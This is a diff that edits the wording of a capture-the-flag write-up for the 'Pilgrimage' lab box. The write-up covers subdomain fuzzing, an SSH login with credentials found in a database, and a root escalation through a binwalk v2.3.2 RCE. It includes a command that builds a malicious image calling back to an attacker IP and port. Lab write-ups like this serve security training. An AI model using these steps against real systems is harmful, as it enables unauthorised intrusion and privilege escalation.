@@ -16,7 +16,7 @@ We see the ports 22 and 80 are open, so the only attack vector is the website, s
 
 ### port 80
 We see that there is a host name we need to add to /etc/hosts before we can reach the website. We also can then 
-fuzz for subdomains but that doesn't give us anything.
+fuzz for subdomains but that doesn't give us anything, so we can leave this and fuzz for subdomains.
 
 ![img_1.png](/assets/img/pilgrimage/img_1.png)
 
@@ -45,7 +45,8 @@ and then converting the hex to the ascii equivalent to see if there is anything 
 
 ![img_5.png](/assets/img/pilgrimage/img_5.png)
 
-In the database file we see that there is a username of emily and the password that we can try to use to ssh into the box.
+In the database file we see that there is a username of emily and the password that we can try to use to ssh into the box
+which is successful.
 
 ![img_6.png](/assets/img/pilgrimage/img_6.png)
 ## Shell as Root
@@ -75,9 +76,10 @@ done
 ```
 
 we see running `/usr/local/bin/binwalk` the version of binwalk is v2.3.2 and there is a 
-[rce](https://www.exploit-db.com/exploits/51249) on this version. Which we can use to get privileges as root.If we run 
+[rce](https://www.exploit-db.com/exploits/51249) on this version. Which we can use to get privileges as root. If we run 
 the `python3 exp.py /var/www/pilgrimage.htb/shrunk/6561bb2e1406b.png 10.10.14.3 1234
-` with exp.py being the exploit from the rce and then copy the created image to the /var/www/pilgrimage.htb/shrunk directory
-so that it triggers the inotify event create and executes the script and gives us a root privileges.
+` with exp.py being the exploit from the link earlier. Then we can copy the created image to the /var/www/pilgrimage.htb/shrunk directory
+so that it triggers the inotify event create and executes the script and gives us a root privileges because the image is
+passed into binwalk and gives us rce.
 
 ![img_8.png](/assets/img/pilgrimage/img_8.png)
